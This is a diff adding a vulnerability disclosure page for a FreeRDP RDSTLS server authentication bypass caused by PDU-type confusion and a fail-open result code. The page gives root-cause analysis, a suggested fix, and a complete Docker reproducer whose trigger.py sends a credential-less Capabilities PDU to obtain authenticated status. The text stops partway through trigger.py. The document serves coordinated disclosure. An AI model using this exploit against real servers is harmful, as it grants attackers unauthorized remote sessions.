@@ -1,0 +1,983 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-TVG98XT0 · freerdp/freerdp</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-TVG98XT0 · freerdp/freerdp</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  auth-bypass
+  <span class="sev-badge sev-high">high</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-73241">CVE-2026-73241</a>
+  <a class="id-badge" href="https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-rqgv-grx4-xm6x">GHSA-rqgv-grx4-xm6x</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ada Logics.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-TVG98XT0: RDSTLS server authentication bypass via PDU-type confusion</h1>
+<p>In FreeRDP's RDSTLS server handshake, rdstls_recv() (rdstls.c:719) dispatches solely on the wire pduType with no check of peer role or handshake state. The rdpRdstls struct is calloc-allocated, so resultCode starts at 0 == RDSTLS_RESULT_SUCCESS. A client that replies to the server's Capabilities PDU with another Capabilities PDU (or an AUTHRSP) instead of an Authentication Request is routed to a handler that returns TRUE without touching resultCode. rdstls_server_authenticate() (rdstls.c:935) then sends AUTHRSP(SUCCESS) and returns authenticated, never evaluating the password or redirection GUID/cookie. A remote attacker thus obtains a full RDP session on any FreeRDP-based server/proxy with RdstlsSecurity enabled.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> freerdp/freerdp<br>
+<strong>Location:</strong> <code>libfreerdp/core/rdstls.c:719</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>Root cause is a fail-open default combined with missing state validation: rdstls_new() calloc-zeroes resultCode to RDSTLS_RESULT_SUCCESS, and rdstls_recv() switches purely on attacker-supplied pduType without consulting rdstls-&gt;state or rdstls-&gt;server. The state-transition checker only validates the server's own fixed sequence, so an unexpected inbound PDU type is silently accepted and the credential-verification path is skipped entirely.</p>
+<h2>Reproduction</h2>
+<ol>
+<li>Connect and negotiate PROTOCOL_RDSTLS at X.224, complete TLS.</li>
+<li>Receive the server's RDSTLS Capabilities PDU.</li>
+<li>Reply with an 8-byte RDSTLS_TYPE_CAPABILITIES PDU (version=1,type=1,dataType=1,versions=1) instead of an Authentication Request (alternatively send RDSTLS_TYPE_AUTHRSP with resultCode=0).</li>
+<li>rdstls_recv() routes it to rdstls_process_capabilities(), which returns TRUE without touching resultCode.</li>
+<li>Server transitions AUTH_REQ→AUTH_RSP, sends AUTHRSP(resultCode=0=SUCCESS), and rdstls_server_authenticate() returns 1.</li>
+<li>Connection advances to CONNECTION_STATE_MCS_CREATE_REQUEST with the session marked authenticated; proceed with a full RDP session.</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Suggested Fix</h2>
+<p>Make the RDSTLS server state machine accept only an Authentication Request PDU at the authentication step (reject any other pduType in rdstls_recv when server &amp;&amp; state==AUTH_REQ), and fail closed: initialise resultCode to a denial value and only set SUCCESS after explicit credential verification.</p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-TVG98XT0.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-TVG98XT0<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Ada Logics. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h1>RDSTLS server authentication bypass: a credential-less Capabilities PDU is accepted at the auth step (fail-open <code>resultCode</code>)</h1>
+<p>This is </p>
+<h2>Summary</h2>
+<p>FreeRDP's server-side RDSTLS handshake dispatches inbound PDUs purely on the
+attacker-supplied wire <code>pduType</code>, without checking that the PDU is the one the
+protocol requires at the current step. The <code>rdpRdstls</code> object is <code>calloc</code>-zeroed,
+so its <code>resultCode</code> starts at <code>0</code> — which is exactly <code>RDSTLS_RESULT_SUCCESS</code>.</p>
+<p>At the point where the server is waiting for the client's Authentication
+Request (the PDU that carries the credentials), a client may instead send a
+Capabilities PDU. <code>rdstls_recv()</code> routes it to <code>rdstls_process_capabilities()</code>,
+which validates a couple of constant fields and returns <code>TRUE</code> without ever
+setting <code>resultCode</code>. The state machine advances, the server sends an
+<code>AUTHRSP</code> carrying the still-zero <code>resultCode</code> (SUCCESS), and
+<code>rdstls_server_authenticate()</code> returns "authenticated" having never evaluated a
+password, redirection GUID, or auto-reconnect cookie.</p>
+<p>The result is a pre-credential authentication bypass on any
+FreeRDP-based server/proxy that enables RDSTLS: an unauthenticated remote client
+reaches a session the server has marked authenticated.</p>
+<p>Importantly, this bypasses a credential check that does run in the normal
+flow: when a client sends a proper <code>RDSTLS_TYPE_AUTHREQ</code>,
+<code>rdstls_process_authentication_request_with_password()</code> compares the client's
+RedirectionGuid / username / domain / password against the server's configured
+values and sets <code>resultCode</code> to <code>ACCESS_DENIED</code> / <code>LOGON_FAILURE</code> on a mismatch.
+The attack simply never reaches that function. The proof-of-concept below
+demonstrates exactly this: the same server that rejects a wrong RedirectionGuid
+with <code>ACCESS_DENIED</code> accepts a credential-less Capabilities PDU as <code>SUCCESS</code>.</p>
+<h2>Affected versions</h2>
+<ul>
+<li><strong>FreeRDP <code>master</code></strong> — reproduced on HEAD
+  <code>5e8e987b469b60a3bafadf8f5afc40f91c09f458</code> on 2026-07-14. The dispatch is at
+  <code>libfreerdp/core/rdstls.c:809</code>, the <code>calloc</code> fail-open default at <code>:122</code>
+  (<code>RDSTLS_RESULT_SUCCESS = 0</code> at <code>:61</code>), and the success gate in
+  <code>rdstls_server_authenticate()</code> at <code>:1025</code>. Unpatched.</li>
+<li><strong>FreeRDP 3.x</strong> — the same defect is present in the released 3.x series (e.g.
+  tag 3.27.1). Because the defect ships in a released tag (not development-branch
+  only), it qualifies for a CVE under the project's supported-versions policy.</li>
+<li>Reachable when the server is configured with <code>RdstlsSecurity = TRUE</code> (a
+  non-default but legitimate deployment setting).</li>
+</ul>
+<h2>Details</h2>
+<p>All line numbers below are at <code>master</code> HEAD
+<code>5e8e987b469b60a3bafadf8f5afc40f91c09f458</code>.</p>
+<h3>The credential check that normally runs</h3>
+<p>When the client sends the required <code>RDSTLS_TYPE_AUTHREQ</code>, the server performs a
+real credential comparison (<code>libfreerdp/core/rdstls.c:570</code>):</p>
+<pre tabindex="0"><code class="language-c">// rdstls_process_authentication_request_with_password()
+rdstls-&gt;resultCode = RDSTLS_RESULT_SUCCESS;                    // :607
+
+if (!rdstls_cmp_data(rdstls-&gt;log, &quot;RedirectionGuid&quot;, serverRedirectionGuid,
+                     serverRedirectionGuidLength, clientRedirectionGuid,
+                     clientRedirectionGuidLength))              // :609
+    rdstls-&gt;resultCode = RDSTLS_RESULT_ACCESS_DENIED;
+if (!rdstls_cmp_str(rdstls-&gt;log, &quot;UserName&quot;, serverUsername, clientUsername))  // :614
+    rdstls-&gt;resultCode = RDSTLS_RESULT_LOGON_FAILURE;
+if (!rdstls_cmp_str(rdstls-&gt;log, &quot;Domain&quot;, ...))              // :617
+    rdstls-&gt;resultCode = RDSTLS_RESULT_LOGON_FAILURE;
+if (!rdstls_cmp_str(rdstls-&gt;log, &quot;Password&quot;, ...))            // :620
+    rdstls-&gt;resultCode = RDSTLS_RESULT_LOGON_FAILURE;
+</code></pre>
+<p><code>rdstls_cmp_data</code> (<code>:524</code>) and <code>rdstls_cmp_str</code> (<code>:547</code>) are genuine
+<code>memcmp</code>/<code>strcmp</code> checks that fail closed on a mismatch. So a wrong credential
+yields <code>ACCESS_DENIED</code>/<code>LOGON_FAILURE</code>, and <code>rdstls_server_authenticate()</code>
+returns failure.</p>
+<h3>The fail-open default</h3>
+<p>The object is zero-initialised, so <code>resultCode == RDSTLS_RESULT_SUCCESS</code> before
+any credential is checked:</p>
+<pre tabindex="0"><code class="language-c">// rdstls.c:61
+    RDSTLS_RESULT_SUCCESS = 0x00000000,
+// rdstls.c:122 — rdstls_new()
+    rdpRdstls* rdstls = (rdpRdstls*)calloc(1, sizeof(rdpRdstls));   // resultCode = 0 = SUCCESS
+</code></pre>
+<h3>The dispatch that skips the check</h3>
+<p>The receive path dispatches on the wire <code>pduType</code> with no check that this is the
+PDU required at the current step:</p>
+<pre tabindex="0"><code class="language-c">// rdstls.c:808 — rdstls_recv() (shared by client and server)
+    const UINT16 pduType = Stream_Get_UINT16(s);                    // :808
+    switch (pduType)                                                // :809 — wire byte only
+    {
+        case RDSTLS_TYPE_CAPABILITIES:
+            if (!rdstls_process_capabilities(rdstls, s))            // returns TRUE, never sets resultCode
+                return -1;
+            break;
+        case RDSTLS_TYPE_AUTHREQ:
+            if (!rdstls_process_authentication_request(rdstls, s))  // the ONLY path that sets resultCode
+                return -1;
+            break;
+        case RDSTLS_TYPE_AUTHRSP:
+            ...
+    }
+    return 1;
+</code></pre>
+<p><code>rdstls_process_capabilities()</code> (<code>:447</code>) validates constant fields and returns
+<code>TRUE</code>/<code>FALSE</code> — it never writes <code>resultCode</code>.</p>
+<p>The server auth routine accepts whatever <code>rdstls_recv</code> returns, then gates solely
+on <code>resultCode</code>:</p>
+<pre tabindex="0"><code class="language-c">// rdstls.c:1009 — rdstls_server_authenticate()
+    if (!rdstls_send_capabilities(rdstls))            return -1;
+    if (!rdstls_recv_authentication_request(rdstls))  return -1;   // accepts a CAPABILITIES PDU
+    if (!rdstls_send_authentication_response(rdstls)) return -1;   // emits AUTHRSP(resultCode)
+    if (rdstls-&gt;resultCode != RDSTLS_RESULT_SUCCESS)  return -1;   // :1025  0 == SUCCESS -&gt; passes
+    return 1;                                                      // authenticated
+</code></pre>
+<p><code>rdstls_recv_authentication_request()</code> (<code>:874</code>) checks only the <em>server's own</em>
+outbound state, then calls <code>rdstls_recv()</code>, which trusts the inbound <code>pduType</code>. A
+<code>RDSTLS_TYPE_CAPABILITIES</code> PDU is therefore accepted in place of the
+credential-bearing <code>RDSTLS_TYPE_AUTHREQ</code>, the credential-comparison function above
+is never invoked, <code>resultCode</code> stays at its <code>calloc</code>-zeroed <code>SUCCESS</code>, and the
+gate at <code>:1025</code> passes.</p>
+<h3>Root cause</h3>
+<p>Two compounding defects: (1) <strong>fail-open default</strong> — <code>resultCode</code> is initialised
+to the success value; (2) <strong>missing state/role validation</strong> — the dispatcher does
+not require an <code>AUTHREQ</code> at the authentication step.</p>
+<h3>Server-side call path</h3>
+<pre tabindex="0"><code>rdp_server_accept_nego                                   libfreerdp/core/connection.c
+  (RdstlsSecurity -&gt; select PROTOCOL_RDSTLS)
+  transport_accept_rdstls  (TLS accept)                  libfreerdp/core/transport.c
+    rdstls_new (server=TRUE, resultCode=0)               rdstls.c:122
+    rdstls_server_authenticate                           rdstls.c:1009
+      rdstls_send_capabilities                           (server -&gt; client)
+      rdstls_recv_authentication_request -&gt; rdstls_recv  rdstls.c:874 / :808
+        attacker sends RDSTLS_TYPE_CAPABILITIES -&gt; rdstls_process_capabilities (resultCode untouched)  rdstls.c:447
+      rdstls_send_authentication_response  -&gt; AUTHRSP(resultCode=0=SUCCESS)
+      resultCode == SUCCESS -&gt; return 1 (authenticated)  rdstls.c:1025
+</code></pre>
+<h2>Impact</h2>
+<p>On a FreeRDP-based server/proxy with RDSTLS enabled, an unauthenticated remote
+attacker completes the RDSTLS authentication step without presenting any
+credential, and the connection advances (marked authenticated) to MCS. No
+password, redirection GUID, or auto-reconnect cookie is ever checked.</p>
+<p>Workaround until patched: do not enable <code>RdstlsSecurity</code> (the default), or add a
+secondary authentication gate in the server's <code>Logon</code> callback (note
+<code>IFCALLRESULT</code> defaults to TRUE, so a missing callback does not mitigate).</p>
+<h2>Proof of Concept</h2>
+<p>A self-contained Docker reproducer builds the shipped FreeRDP sample server
+(<code>sfreerdp-server</code>) at the affected commit and runs <strong>three RDSTLS connections
+against the same server</strong>, each reaching the authentication step and sending a
+different PDU:</p>
+<ol>
+<li><strong>Positive control</strong> — a proper <code>AUTHREQ</code> carrying the <em>correct</em>
+   RedirectionGuid → server returns <code>SUCCESS</code> (the auth path works).</li>
+<li><strong>Negative control</strong> — a proper <code>AUTHREQ</code> carrying a <em>wrong</em> RedirectionGuid →
+   server returns <code>ACCESS_DENIED</code> (the server genuinely enforces the credential).</li>
+<li><strong>Attack</strong> — a credential-less <code>CAPABILITIES</code> PDU at the auth step → server
+   returns <code>SUCCESS</code> (the bypass).</li>
+</ol>
+<p>The positive/negative controls prove the server is really authenticating; the
+attack, under the identical server configuration, shows the credential-less PDU
+being accepted anyway.</p>
+<h3>A note on the server configuration (the target is not modified)</h3>
+<p>The shipped sample server hardcodes its security protocols in <code>test_peer_init()</code>
+and exposes <strong>no</strong> command-line flag to change them. The reproducer therefore sets
+two supported <em>deployment</em> settings in <code>server/Sample/sfreerdp.c</code> (via
+<code>configure_server.py</code>): <code>RdstlsSecurity = TRUE</code> (so the server negotiates RDSTLS,
+default FALSE) and a 16-byte <code>RedirectionGuid</code> (so the server has a credential to
+enforce, enabling the negative control). This represents an administrator who
+deploys RDSTLS redirection. <strong>The vulnerable code in
+<code>libfreerdp/core/rdstls.c</code> is built and run completely unmodified.</strong></p>
+<h3>Build &amp; run</h3>
+<pre tabindex="0"><code class="language-sh">docker build -t frdp-rdstls-bypass .
+docker run --rm frdp-rdstls-bypass
+</code></pre>
+<h3>Observed output (master HEAD <code>5e8e987b</code>, 2026-07-14)</h3>
+<pre tabindex="0"><code>----- POSITIVE control: AUTHREQ + CORRECT RedirectionGuid -----
+[*] server Capabilities PDU: 0100010001000100
+[*] -&gt; sending auth-step PDU (30 bytes): 01000200010010000102030405060708090a0b0c0d0e0f10000000000000
+[*] &lt;- AUTHRSP pduType=0x0004 resultCode=SUCCESS
+
+----- NEGATIVE control: AUTHREQ + WRONG RedirectionGuid -----
+[*] server Capabilities PDU: 0100010001000100
+[*] -&gt; sending auth-step PDU (30 bytes): 0100020001001000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa000000000000
+[*] &lt;- AUTHRSP pduType=0x0004 resultCode=ACCESS_DENIED
+
+----- ATTACK: credential-less CAPABILITIES PDU -----
+[*] server Capabilities PDU: 0100010001000100
+[*] -&gt; sending auth-step PDU (8 bytes): 0100010001000100
+[*] &lt;- AUTHRSP pduType=0x0004 resultCode=SUCCESS
+
+========================================================================
+RDSTLS authentication result matrix (same server, RedirectionGuid configured):
+  positive (correct credential)  -&gt; SUCCESS         expect SUCCESS
+  negative (wrong credential)    -&gt; ACCESS_DENIED   expect ACCESS_DENIED
+  ATTACK   (no credential)       -&gt; SUCCESS         expect (secure) rejection
+========================================================================
+VULNERABLE: the server REJECTS a wrong RedirectionGuid (ACCESS_DENIED) but
+            ACCEPTS a credential-less Capabilities PDU as SUCCESS.
+            Real RDSTLS authentication is bypassed via PDU-type confusion.
+</code></pre>
+<p>The server log (from the negative control) confirms the credential check runs:
+<code>[ERROR][com.freerdp.core.rdstls] - [rdstls_cmp_data]: RedirectionGuid
+verification failed</code> → <code>[transport_accept_rdstls]: client authentication failure</code>.</p>
+<h3>Complete reproducer files</h3>
+<p>Place the following four files in one directory and run the build/run commands
+above.</p>
+<h4><code>Dockerfile</code></h4>
+<pre tabindex="0"><code class="language-dockerfile">FROM ubuntu:24.04
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Pinned commit: current upstream HEAD of the default branch.
+ARG TARGET_COMMIT=5e8e987b469b60a3bafadf8f5afc40f91c09f458
+ARG CLANG_VERSION=20
+
+RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
+        ca-certificates git cmake ninja-build pkg-config make \
+        libssl-dev zlib1g-dev openssl python3 \
+        wget gnupg lsb-release software-properties-common \
+    &amp;&amp; wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh &amp;&amp; chmod +x /tmp/llvm.sh &amp;&amp; /tmp/llvm.sh ${CLANG_VERSION} \
+    &amp;&amp; apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
+    &amp;&amp; rm -rf /var/lib/apt/lists/*
+
+ENV CC=clang-20 CXX=clang++-20
+
+# Cacheable clone, then a separate checkout so the build can be re-pinned to any commit via --build-arg TARGET_COMMIT.
+RUN git clone https://github.com/FreeRDP/FreeRDP /src/repo
+WORKDIR /src/repo
+RUN git checkout ${TARGET_COMMIT}
+
+# Deployment configuration only (does NOT touch the vulnerable libfreerdp/core/rdstls.c):
+# enable the default-FALSE RdstlsSecurity setting so the sample server negotiates RDSTLS,
+# and configure a RedirectionGuid so the server has a real credential to enforce (lets the
+# reproducer show a wrong-credential rejection next to the credential-less bypass).
+COPY configure_server.py /tmp/configure_server.py
+RUN python3 /tmp/configure_server.py \
+    &amp;&amp; grep -nE &quot;FreeRDP_RdstlsSecurity, TRUE|FreeRDP_RedirectionGuid&quot; server/Sample/sfreerdp.c
+
+# Logic/auth bug -&gt; ASan not required. Build the server + sample server only.
+RUN cmake -GNinja -B /opt/build -S /src/repo \
+        -DCMAKE_BUILD_TYPE=Debug \
+        -DWITH_SERVER=ON -DWITH_SAMPLE=ON \
+        -DWITH_CLIENT=OFF -DWITH_CLIENT_COMMON=OFF -DWITH_CLIENT_SDL=OFF \
+        -DWITH_X11=OFF -DWITH_WAYLAND=OFF -DWITH_SHADOW=OFF -DWITH_PLATFORM_SERVER=OFF \
+        -DWITH_MANPAGES=OFF -DBUILD_TESTING=OFF -DWITH_SAMPLE_SERVER=ON \
+        -DWITH_FFMPEG=OFF -DWITH_SWSCALE=OFF -DWITH_DSP_FFMPEG=OFF \
+        -DWITH_CAIRO=OFF -DWITH_PCSC=OFF -DWITH_CUPS=OFF -DWITH_PULSE=OFF \
+        -DWITH_ALSA=OFF -DWITH_OSS=OFF -DWITH_FUSE=OFF -DWITH_KRB5=OFF \
+    &amp;&amp; ninja -C /opt/build sfreerdp-server
+
+RUN mkdir -p /opt/server
+COPY trigger.py /opt/trigger.py
+COPY run.sh /opt/run.sh
+RUN chmod +x /opt/run.sh
+
+CMD [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;/opt/run.sh; echo DONE=$?&quot;]
+</code></pre>
+<h4><code>configure_server.py</code></h4>
+<pre tabindex="0"><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;
+Deployment configuration for the shipped FreeRDP sample server (sfreerdp-server).
+
+The sample server hardcodes its security protocols in test_peer_init() and exposes
+NO command-line flag to change them, so this script edits two *deployment settings*
+into server/Sample/sfreerdp.c:
+
+  1. FreeRDP_RdstlsSecurity = TRUE      -&gt; the server negotiates RDSTLS (default FALSE)
+  2. FreeRDP_RedirectionGuid = &lt;16 bytes&gt; -&gt; the server has a real credential to enforce,
+     so rdstls_process_authentication_request_with_password() actually rejects a wrong
+     RedirectionGuid (rdstls_cmp_data / ACCESS_DENIED). This lets the reproducer show a
+     negative control (wrong credential -&gt; rejected) next to the bypass.
+
+This does NOT touch the vulnerable code in libfreerdp/core/rdstls.c; it only configures
+the server the way an administrator deploying RDSTLS redirection would.
+&quot;&quot;&quot;
+import re
+import sys
+import pathlib
+
+SRC = pathlib.Path(&quot;server/Sample/sfreerdp.c&quot;)
+text = SRC.read_text()
+
+# Anchor: the existing NlaSecurity=FALSE settings line in test_peer_init().
+anchor = re.compile(
+    r'(if \(!freerdp_settings_set_bool\(settings, FreeRDP_NlaSecurity, FALSE\)\)\s*\n\s*goto fail;\n)'
+)
+
+inject = (
+    &quot;\t/* --- reproducer deployment config (does NOT touch libfreerdp/core/rdstls.c) --- */\n&quot;
+    &quot;\tif (!freerdp_settings_set_bool(settings, FreeRDP_RdstlsSecurity, TRUE))\n&quot;
+    &quot;\t\tgoto fail;\n&quot;
+    &quot;\t{\n&quot;
+    &quot;\t\tstatic const BYTE _repro_guid[16] = {\n&quot;
+    &quot;\t\t\t0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,\n&quot;
+    &quot;\t\t\t0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10 };\n&quot;
+    &quot;\t\tif (!freerdp_settings_set_pointer_len(settings, FreeRDP_RedirectionGuid, _repro_guid, sizeof(_repro_guid)))\n&quot;
+    &quot;\t\t\tgoto fail;\n&quot;
+    &quot;\t\tif (!freerdp_settings_set_uint32(settings, FreeRDP_RedirectionGuidLength, sizeof(_repro_guid)))\n&quot;
+    &quot;\t\t\tgoto fail;\n&quot;
+    &quot;\t}\n&quot;
+)
+
+new_text, n = anchor.subn(lambda m: m.group(1) + inject, text, count=1)
+if n != 1:
+    sys.stderr.write(&quot;ERROR: could not find the NlaSecurity anchor in sfreerdp.c\n&quot;)
+    sys.exit(1)
+
+SRC.write_text(new_text)
+print(&quot;[configure_server] RdstlsSecurity=TRUE + RedirectionGuid(16B) injected into sfreerdp.c&quot;)
+</code></pre>
+<h4><code>trigger.py</code></h4>
+<pre tabindex="0"><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;
+RDSTLS server authentication bypass via PDU-type confusion.
+
+This driver runs THREE cases against the same stock sfreerdp-server (built with
+RDSTLS enabled and a RedirectionGuid credential configured; libfreerdp/core/rdstls.c
+is unmodified). Each case is a fresh RDSTLS connection that gets to the server's
+authentication step, then sends a different PDU:
+
+  1. POSITIVE control : AUTHREQ(password) carrying the CORRECT RedirectionGuid
+                        -&gt; expect resultCode == SUCCESS         (auth path works)
+  2. NEGATIVE control : AUTHREQ(password) carrying a WRONG RedirectionGuid
+                        -&gt; expect resultCode == ACCESS_DENIED   (server DOES enforce)
+  3. ATTACK           : a credential-less CAPABILITIES PDU (PDU-type confusion)
+                        -&gt; observed resultCode == SUCCESS        (BYPASS)
+
+RDSTLS wire format (libfreerdp/core/rdstls.c): every PDU is
+  UINT16 version(=0x0001) | UINT16 pduType | body   (all little-endian)
+&quot;&quot;&quot;
+import socket
+import ssl
+import struct
+import sys
+
+HOST = &quot;127.0.0.1&quot;
+PORT = 3389
+
+PROTOCOL_RDSTLS = 0x04
+
+RDSTLS_VERSION_1 = 0x0001
+RDSTLS_TYPE_CAPABILITIES = 0x0001
+RDSTLS_TYPE_AUTHREQ = 0x0002
+RDSTLS_TYPE_AUTHRSP = 0x0004
+RDSTLS_DATA_CAPABILITIES = 0x0001
+RDSTLS_DATA_PASSWORD_CREDS = 0x0001
+
+RDSTLS_RESULT_SUCCESS = 0x00000000
+RDSTLS_RESULT_ACCESS_DENIED = 0x00000005
+RDSTLS_RESULT_LOGON_FAILURE = 0x0000052e
+
+# Must match the RedirectionGuid configure_server.py sets on the server.
+EXPECTED_GUID = bytes(range(1, 17))          # 01 02 .. 10
+WRONG_GUID = b&quot;\xAA&quot; * 16
+
+
+def result_str(rc):
+    return {
+        RDSTLS_RESULT_SUCCESS: &quot;SUCCESS&quot;,
+        RDSTLS_RESULT_ACCESS_DENIED: &quot;ACCESS_DENIED&quot;,
+        RDSTLS_RESULT_LOGON_FAILURE: &quot;LOGON_FAILURE&quot;,
+    }.get(rc, &quot;0x%08x&quot; % rc)
+
+
+def recvn(sock, n):
+    buf = b&quot;&quot;
+    while len(buf) &lt; n:
+        chunk = sock.recv(n - len(buf))
+        if not chunk:
+            raise EOFError(&quot;connection closed (got %d/%d bytes)&quot; % (len(buf), n))
+        buf += chunk
+    return buf
+
+
+def x224_connection_request(requested_protocols):
+    neg = struct.pack(&quot;&lt;BBHI&quot;, 0x01, 0x00, 0x0008, requested_protocols)
+    x224 = struct.pack(&quot;&lt;BBHHB&quot;, 6 + len(neg), 0xE0, 0x0000, 0x0000, 0x00) + neg
+    tpkt = struct.pack(&quot;&gt;BBH&quot;, 0x03, 0x00, 4 + len(x224)) + x224
+    return tpkt
+
+
+def read_tpkt(sock):
+    hdr = recvn(sock, 4)
+    assert hdr[0] == 0x03, &quot;not a TPKT response: %r&quot; % hdr
+    length = struct.unpack(&quot;&gt;H&quot;, hdr[2:4])[0]
+    return hdr + recvn(sock, length - 4)
+
+
+def capabilities_pdu():
+    # version | CAPABILITIES | dataType=CAPABILITIES | supportedVersions
+    return struct.pack(&quot;&lt;HHHH&quot;, RDSTLS_VERSION_1, RDSTLS_TYPE_CAPABILITIES,
+                       RDSTLS_DATA_CAPABILITIES, RDSTLS_VERSION_1)
+
+
+def authreq_password_pdu(guid):
+    # version | AUTHREQ | dataType=PASSWORD_CREDS
+    body = struct.pack(&quot;&lt;HHH&quot;, RDSTLS_VERSION_1, RDSTLS_TYPE_AUTHREQ, RDSTLS_DATA_PASSWORD_CREDS)
+    # RedirectionGuid: UINT16 len + bytes
+    body += struct.pack(&quot;&lt;H&quot;, len(guid)) + guid
+    # Username / Domain / Password: UINT16 len + UTF-16LE (empty -&gt; len 0)
+    body += struct.pack(&quot;&lt;H&quot;, 0) + struct.pack(&quot;&lt;H&quot;, 0) + struct.pack(&quot;&lt;H&quot;, 0)
+    return body
+
+
+def run_case(label, auth_step_pdu):
+    &quot;&quot;&quot;Connect, negotiate RDSTLS + TLS, read the server Capabilities PDU, send the
+    given auth-step PDU, and return the server's AUTHRSP resultCode. Returns None if
+    the server rejects/closes without an AUTHRSP (the expected secure/fixed behavior
+    for the attack case).&quot;&quot;&quot;
+    print(&quot;\n----- %s -----&quot; % label, flush=True)
+    try:
+        sock = socket.create_connection((HOST, PORT), timeout=15)
+        sock.sendall(x224_connection_request(PROTOCOL_RDSTLS))
+        cc = read_tpkt(sock)
+        if not (len(cc) &gt;= 19 and cc[11] == 0x02 and
+                struct.unpack(&quot;&lt;I&quot;, cc[15:19])[0] == PROTOCOL_RDSTLS):
+            print(&quot;[!] server did not select RDSTLS; abort&quot;, flush=True)
+            return None
+
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        try:
+            ctx.set_ciphers(&quot;ALL:@SECLEVEL=0&quot;)
+        except ssl.SSLError:
+            pass
+        tls = ctx.wrap_socket(sock, server_hostname=HOST)
+
+        caps = recvn(tls, 8)  # server -&gt; client RDSTLS Capabilities PDU
+        print(&quot;[*] server Capabilities PDU: %s&quot; % caps.hex(), flush=True)
+        print(&quot;[*] -&gt; sending auth-step PDU (%d bytes): %s&quot;
+              % (len(auth_step_pdu), auth_step_pdu.hex()), flush=True)
+        tls.sendall(auth_step_pdu)
+
+        rsp = recvn(tls, 10)  # AUTHRSP = version(2) type(2) dataType(2) resultCode(4)
+        ptype = struct.unpack(&quot;&lt;H&quot;, rsp[2:4])[0]
+        result_code = struct.unpack(&quot;&lt;I&quot;, rsp[6:10])[0]
+        try:
+            tls.close()
+        except OSError:
+            pass
+        print(&quot;[*] &lt;- AUTHRSP pduType=0x%04x resultCode=%s&quot;
+              % (ptype, result_str(result_code)), flush=True)
+        return result_code
+    except (EOFError, OSError, ssl.SSLError) as e:
+        # No AUTHRSP: server rejected the PDU and closed the connection.
+        print(&quot;[*] &lt;- no AUTHRSP; server rejected/closed the connection (%r)&quot; % e, flush=True)
+        return None
+
+
+def main():
+    pos = run_case(&quot;POSITIVE control: AUTHREQ + CORRECT RedirectionGuid&quot;, authreq_password_pdu(EXPECTED_GUID))
+    neg = run_case(&quot;NEGATIVE control: AUTHREQ + WRONG RedirectionGuid&quot;, authreq_password_pdu(WRONG_GUID))
+    atk = run_case(&quot;ATTACK: credential-less CAPABILITIES PDU&quot;, capabilities_pdu())
+
+    def cell(rc):
+        return &quot;None&quot; if rc is None else result_str(rc)
+
+    print(&quot;\n&quot; + &quot;=&quot; * 72, flush=True)
+    print(&quot;RDSTLS authentication result matrix (same server, RedirectionGuid configured):&quot;, flush=True)
